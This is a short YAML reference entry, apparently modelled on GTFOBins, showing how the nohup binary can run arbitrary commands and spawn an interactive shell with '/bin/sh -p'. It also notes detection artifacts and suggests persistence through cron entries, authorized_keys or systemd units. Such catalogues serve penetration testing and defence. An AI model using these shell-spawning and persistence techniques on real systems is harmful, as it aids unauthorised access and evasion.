---
name: nohup
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: |-
    nohup /path/to/command
    cat nohup.out
  notes: The `nohup.out` file contains the standard output and error of the command.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'
  notes: This creates a `nohup.out` file in the current working directory.
references:
- https://gtfobins.github.io/gtfobins/nohup/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
